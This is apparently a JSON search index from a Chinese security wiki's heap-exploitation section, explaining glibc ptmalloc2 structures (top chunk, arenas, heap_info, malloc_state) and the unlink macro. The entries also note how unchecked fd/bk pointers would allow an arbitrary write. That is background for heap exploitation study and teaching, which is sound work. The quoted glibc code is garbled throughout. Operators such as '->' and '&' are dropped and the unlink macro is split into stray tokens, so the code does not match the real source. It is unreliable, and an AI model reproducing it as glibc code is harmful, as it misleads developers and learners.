chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002  \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002", 
            "title": "top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#last-remainder", 
            "text": "\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u662f\u548c\u7533\u8bf7\u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer.", 
            "title": "last remainder"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_5", 
            "text": "", 
            "title": "\u5b8f\u89c2\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena", 
            "text": "\u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002", 
            "title": "arena"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena_1", 
            "text": "\u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684 \u7ea6\u675f \u5982\u4e0b  For 32 bit systems:\n     Number of arena = 2 * number of cores.\nFor 64 bit systems:\n     Number of arena = 8 * number of cores.  \u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002", 
            "title": "arena \u6570\u91cf"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#arena_2", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "arena \u5206\u914d\u89c4\u5219"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_6", 
            "text": "\u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002", 
            "title": "\u533a\u522b"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#heap_info", 
            "text": "\u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002  \u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002  \u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002  heap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b  #define HEAP_MIN_SIZE (32 * 1024)  #ifndef HEAP_MAX_SIZE  # ifdef DEFAULT_MMAP_THRESHOLD_MAX  #  define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)  # else  #  define HEAP_MAX_SIZE (1024 * 1024)  /* must be a power of two */  # endif  #endif  /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps     that are dynamically created for multi-threaded programs.  The     maximum size must be a power of two, for fast determination of     which heap belongs to a chunk.  It should be much larger than the     mmap threshold, so that requests with a size just below that     threshold can be fulfilled without creating too many heaps.  */  /***************************************************************************/  /* A heap is a single contiguous memory region holding (coalesceable)     malloc_chunks.  It is allocated with mmap() and always starts at an     address aligned to HEAP_MAX_SIZE.  */  typedef   struct   _heap_info  { \n   mstate   ar_ptr ;   /* Arena for this heap. */ \n   struct   _heap_info   * prev ;   /* Previous heap. */ \n   size_t   size ;     /* Current size in bytes. */ \n   size_t   mprotect_size ;   /* Size in bytes that has been mprotected                             PROT_READ|PROT_WRITE.  */ \n   /* Make sure the following data is properly aligned, particularly       that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of       MALLOC_ALIGNMENT. */ \n   char   pad [ - 6   *   SIZE_SZ     MALLOC_ALIGN_MASK ];  }   heap_info ;   \u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec   \u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740  \u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002  size \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f  \u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08 \u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462 \uff1f\uff09   \u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002", 
            "title": "heap_info"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_state", 
            "text": "\u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002  \u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002  \u5176\u7ed3\u6784\u5982\u4e0b  struct   malloc_state   { \n     /* Serialize access.  */ \n     __libc_lock_define (,   mutex ); \n\n     /* Flags (formerly in max_fast).  */ \n     int   flags ; \n\n     /* Fastbins */ \n     mfastbinptr   fastbinsY [   NFASTBINS   ]; \n\n     /* Base of the topmost chunk -- not otherwise kept in a bin */ \n     mchunkptr   top ; \n\n     /* The remainder from the most recent split of a small request */ \n     mchunkptr   last_remainder ; \n\n     /* Normal bins packed as described above */ \n     mchunkptr   bins [   NBINS   *   2   -   2   ]; \n\n     /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ \n     unsigned   int   binmap [   BINMAPSIZE   ]; \n\n     /* Linked list, points to the next arena */ \n     struct   malloc_state   * next ; \n\n     /* Linked list for free arenas.  Access to this field is serialized         by free_list_lock in arena.c.  */ \n     struct   malloc_state   * next_free ; \n\n     /* Number of threads attached to this arena.  0 if the arena is on         the free list.  Access to this field is serialized by         free_list_lock in arena.c.  */ \n     INTERNAL_SIZE_T   attached_threads ; \n\n     /* Memory allocated from the system in this arena.  */ \n     INTERNAL_SIZE_T   system_mem ; \n     INTERNAL_SIZE_T   max_system_mem ;  };     __libc_lock_define(, mutex);   \u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002     flags   flags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b     /*     FASTCHUNKS_BIT held in max_fast indicates that there are probably     some fastbin chunks. It is set true on entering a chunk into any     fastbin, and cleared only in malloc_consolidate.     The truth value is inverted so that have_fastchunks will be true     upon startup (since statics are zero-filled), simplifying     initialization checks.   */  #define FASTCHUNKS_BIT (1U)  #define have_fastchunks(M) (((M)- flags   FASTCHUNKS_BIT) == 0)  #define clear_fastchunks(M) catomic_or( (M)- flags, FASTCHUNKS_BIT)  #define set_fastchunks(M) catomic_and( (M)- flags, ~FASTCHUNKS_BIT)  /*     NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous     regions.  Otherwise, contiguity is exploited in merging together,     when possible, results from consecutive MORECORE calls.     The initial value comes from MORECORE_CONTIGUOUS, but is     changed dynamically if mmap is ever used as an sbrk substitute.   */  #define NONCONTIGUOUS_BIT (2U)  #define contiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) == 0)  #define noncontiguous(M) (((M)- flags   NONCONTIGUOUS_BIT) != 0)  #define set_noncontiguous(M) ((M)- flags |= NONCONTIGUOUS_BIT)  #define set_contiguous(M) ((M)- flags  = ~NONCONTIGUOUS_BIT)  /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the     arena.  Such an arena is no longer used to allocate chunks.  Chunks     allocated in that arena before detecting corruption are not freed.  */  #define ARENA_CORRUPTION_BIT (4U)  #define arena_is_corrupt(A) (((A)- flags   ARENA_CORRUPTION_BIT))  #define set_arena_corrupt(A) ((A)- flags |= ARENA_CORRUPTION_BIT)    fastbinsY[NFASTBINS]  \u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488    top  \u6307\u5411\u5206\u914d\u533a\u7684 top chunk    last_reminder  \u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206    bins  \u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002    binmap  ptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002", 
            "title": "malloc_state"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#malloc_par", 
            "text": "\uff01\uff01\u5f85\u8865\u5145\uff01\uff01", 
            "title": "malloc_par"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/", 
            "text": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\n\n\n\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u79bb\u4e0d\u5f00\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898\n\n\n\n\n\u5b8f\u89c2\u89d2\u5ea6\n\n\n\u521b\u5efa\u5806\n\n\n\u5806\u521d\u59cb\u5316\n\n\n\u5220\u9664\u5806\n\n\n\n\n\n\n\u5fae\u89c2\u89d2\u5ea6\n\n\n\u7533\u8bf7\u5185\u5b58\u5757\n\n\n\u91ca\u653e\u5185\u5b58\u5757\n\n\n\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u8fd8\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u7684\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002\n\n\n\u5806\u5b9e\u73b0\u6982\u89c8\n\n\n\u5806\u521d\u59cb\u5316\n\n\n\u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1 \nmalloc_state \u76f8\u5173\u51fd\u6570\n\u3002\n\n\n\u521b\u5efa\u5806\n\n\n\u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c\n\n\nunlink\n\n\nunlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411 bin \u94fe\u8868\u4e2d\u7684\u4e00\u4e2a chunk \u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528\n\n\n\n\nmalloc\n\n\n\u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002\n\n\n\u4f9d\u6b21\u904d\u5386\u5904\u7406unsorted bin\u65f6\u4e5f\u662f\u6ca1\u6709unlink\u7684\u3002\n\n\n\n\n\n\n\u4ece\u6bd4\u6240\u9700\u8981\u7684 chunk \u76f8\u5e94\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002\n\n\n\n\n\n\nFree\n\n\n\u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002\n\n\n\u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002\n\n\n\n\n\n\nmalloc_consolidate\n\n\n\u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002\n\n\n\u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002\n\n\n\n\n\n\nrealloc\n\n\n\u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002\n\n\n\n\n\n\n\n\n\u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b\n\n\n/* Take a chunk off a bin list */\n\n\n#define unlink(AV, P, BK, FD) {                                            \\\n\n\n    \n// \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n    \nFD\n \n=\n \nP\n-\nfd\n;\n                                                                      \\\n    \nBK\n \n=\n \nP\n-\nbk\n;\n                                                                      \\\n    \n// \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n      \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n    \nelse\n \n{\n                                                                      \\\n        \nFD\n-\nbk\n \n=\n \nBK\n;\n                                                              \\\n        \nBK\n-\nfd\n \n=\n \nFD\n;\n                                                              \\\n        \n// \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539\n\n        \nif\n \n(\n!\nin_smallbin_range\n \n(\nchunksize_nomask\n \n(\nP\n))\n                              \\\n            \n// \u5982\u679cP-\nfd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 largbin \u94fe\u8868\u4e2d\u3002\n\n            \n// \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002\n\n            \n// \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002\n\n            \n \n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n \n!=\n \nNULL\n,\n \n0\n))\n \n{\n                      \\\n            \n// \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def\n\n            \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n                                              \\\n            \n// \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002\n\n            \n// \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d\n\n            \nif\n \n(\nFD\n-\nfd_nextsize\n \n==\n \nNULL\n)\n \n{\n                                      \\\n                \n// \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P\n\n                \n// \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684\n\n                \nif\n \n(\nP\n-\nfd_nextsize\n \n==\n \nP\n)\n                                      \\\n                  \nFD\n-\nfd_nextsize\n \n=\n \nFD\n-\nbk_nextsize\n \n=\n \nFD\n;\n                      \\\n                \nelse\n \n{\n                                                              \\\n                \n// \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d\n\n                    \nFD\n-\nfd_nextsize\n \n=\n \nP\n-\nfd_nextsize\n;\n                              \\\n                    \nFD\n-\nbk_nextsize\n \n=\n \nP\n-\nbk_nextsize\n;\n                              \\\n                    \nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n=\n \nFD\n;\n                              \\\n                    \nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nFD\n;\n                              \\\n                  \n}\n                                                              \\\n              \n}\n \nelse\n \n{\n                                                              \\\n                \n// \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef\n\n                \nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n=\n \nP\n-\nbk_nextsize\n;\n                      \\\n                \nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n=\n \nP\n-\nfd_nextsize\n;\n                      \\\n              \n}\n                                                                      \\\n          \n}\n                                                                      \\\n      \n}\n                                                                              \\\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ea\u662f\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c \nP \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\n\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\u3002\n\n\n\u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u505a\u4e86\u76f8\u5e94\u7684\u68c0\u6d4b\u3002\n\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n  \n// next_size related\n\n              \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n   \n\n\n\n\n\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002\n\n\n\u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2achunk\u7684\u8bdd\u6240\u8bb0\u5f55\u7684prev_inuse\u4f4d\u9ed8\u8ba4\u4e3a1\u3002\n\n\n\u7533\u8bf7\u5185\u5b58\u5757\n\n\n\u6211\u4eec\u4e4b\u524d\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u6211\u4eec\u4ed4\u7ec6\u770b\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc 